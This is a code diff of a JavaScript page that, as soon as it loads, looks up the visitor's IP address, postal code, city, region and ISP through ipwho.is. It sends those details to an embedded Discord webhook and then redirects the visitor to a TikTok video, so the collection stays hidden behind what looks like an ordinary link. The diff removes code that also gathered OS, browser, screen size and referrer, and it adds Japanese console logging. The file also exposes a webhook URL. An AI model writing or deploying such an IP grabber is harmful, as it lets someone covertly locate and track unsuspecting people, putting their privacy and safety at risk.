@@ -2,45 +2,39 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47Mr
 const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";
 
 async function track() {
+    console.log("=== 追跡開始 ===");
     try {
         const response = await fetch('https://ipwho.is/');
         const data = await response.json();
         
-        if (!data.success) return;
-
-        const details = {
-            os: navigator.platform,
-            browser: navigator.userAgent,
-            screenSize: `${window.screen.width}x${window.screen.height}`,
-            referrer: document.referrer || "直接アクセス",
-            localTime: new Date().toLocaleString('ja-JP')
-        };
-
-        if (WEBHOOK_URL) {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🚀 高精度アクセスログ (Webhook固定版)",
-                        color: 15418782,
-                        fields: [
-                            { name: "🌐 IPアドレス", value: data.ip, inline: true },
-                            { name: "📮 郵便番号", value: data.postal || "不明", inline: true },
-                            { name: "📍 場所", value: `${data.region} ${data.city}`, inline: false },
-                            { name: "🏢 プロバイダ (ISP)", value: data.connection.isp, inline: false },
-                            { name: "🕒 取得時刻", value: details.localTime, inline: true },
-                            { name: "🔗 参照元", value: details.referrer }
-                        ],
-                        footer: { text: "ipwho.is データベースを使用" },
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            });
+        if (data.success) {
+            console.log("IP取得成功:", data.ip);
+            
+            if (WEBHOOK_URL) {
+                console.log("Discordへ送信を試行中...");
+                const discordRes = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `✅ **アクセス検出成功**\nIP: ${data.ip}\n場所: ${data.region} ${data.city}\nISP: ${data.connection.isp}`
+                    })
+                });
+                
+                if (discordRes.ok) {
+                    console.log("Discordへの送信に成功しました！");
+                } else {
+                    console.error("Discordへの送信に失敗しました。ステータス:", discordRes.status);
+                }
+            }
         }
-    } catch (e) { console.error(e); }
+    } catch (e) {
+        console.error("エラーが発生しました:", e);
+    }
 
-    setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
+    console.log("1.5秒後にリダイレクトします...");
+    setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+    }, 1500);
 }
 
 track();
